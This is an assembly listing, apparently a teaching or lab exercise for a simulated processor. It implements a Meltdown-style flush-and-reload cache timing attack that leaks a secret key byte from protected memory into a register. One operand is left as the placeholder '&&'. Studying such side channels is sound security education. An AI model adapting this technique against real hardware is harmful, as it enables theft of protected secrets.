#; Unprotected Memory:  0 KB -  64 KB or     0 to 65535
#; Protected Memory:   64 KB - 128 KB or 65536 to 131071
#;
#; Key Location: 102 KB or 104447
#;   Key offset: 6, 12, 18...

store_char_array_start:
            addi            r9, r0, 0        #; r9 : index (i)
            addi            r10, r0, 128     #; r10 : max value
store_char_array:
            muli            r11, r9, 4
            sb              r9, 0(r11)

            addi            r9, r9, 1        #; i++
            bge             r9, r10 store_char_array_end
            jal             r1, store_char_array
store_char_array_end:
            addi            r1, r0, 0
            addi            r9, r0, 0
            addi            r10, r0, 0
            addi            r11, r0, 0
            addi            r19, r0, 0
            cflush                          #; Cache flush



check_char_start:
            addi            r10, r0, 1      #; id for exception
            addi            r6, r0, 128     #; max
            addi            r9, r0, 4       #; max time
            
            addi            r3, r0, 0       #; index

location_to_access:
            addi            r12, r0, 6
            #; set the multiplier for r15 to get that char of string
            muli            r15, r12, &&
            addi            r2, r15, 104448


check_char:
            cflush                          #; Cache flush

            lb              r5, 0(r2)
            muli            r8, r5, 4
            lb              r11, 0(r8)

exception_1:
            muli            r13, r3, 4
            rdcycles        r24             #; Read cycle counter
            lb              r4, 0(r13)
            rdcycles        r27             #; Read cycle counter
            sub             r7, r27, r24

            blt             r7, r9 check_char_success

            addi            r3, r3, 1       #; i++
            bge             r3, r6 check_char_end
            jal             r1, check_char

check_char_success:
            addi            r10, r0, 0
            addi            r18, r3, 0

check_char_end:
            beq             r0, r0 end


exception:
            addi            r25, r0, 1
            beq             r10, r25 exception_1
end:
#; secret character will show up in "r18" in ascii format